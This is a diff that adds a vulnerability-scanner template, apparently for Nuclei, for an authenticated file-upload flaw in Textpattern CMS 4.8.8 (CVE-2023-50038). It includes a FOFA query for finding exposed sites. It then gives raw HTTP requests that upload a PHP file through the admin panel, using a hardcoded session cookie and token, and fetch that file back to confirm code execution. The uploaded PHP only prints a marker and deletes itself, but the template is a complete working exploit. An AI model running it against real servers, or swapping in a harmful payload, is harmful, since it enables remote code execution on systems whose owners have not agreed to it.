@@ -1,0 +1,76 @@
+id: textpattern-file-upload
+
+info:
+  name: Textpattern CMS 后台文件上传功能权限控制缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Textpattern-CMS"
+        Textpattern CMS v4.8.8版本后台管理模块存在文件上传安全机制缺失问题，攻击者可利用该缺陷绕过文件类型校验上传恶意文件，最终实现服务器远程代码执行。
+  reference:
+  - CVE-2023-50038
+  tags: Textpattern
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /textpattern/textpattern/index.php?event=file HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    X-Requested-With: XMLHttpRequest
+    Content-Type: multipart/form-data; boundary=---------------------------50124112016268391132465212078
+    Connection: close
+    Cookie: txp_login=admin%2C8303b159c13c22402a789348e7dbd46d; txp_login_public=cfeff738edadmin
+
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="fileInputOrder"
+
+    1/1
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="app_mode"
+
+    async
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+    2000000
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="event"
+
+    file
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="step"
+
+    file_insert
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="id"
+
+
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="_txp_token"
+
+    3026382e9eefd2d3593ad25522d295d4
+    -----------------------------50124112016268391132465212078
+    Content-Disposition: form-data; name="thefile[]"; filename="NTest.php"
+    Content-Type: application/octet-stream
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+
+    -----------------------------50124112016268391132465212078--
+- raw:
+  - |
+    GET /textpattern/files/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
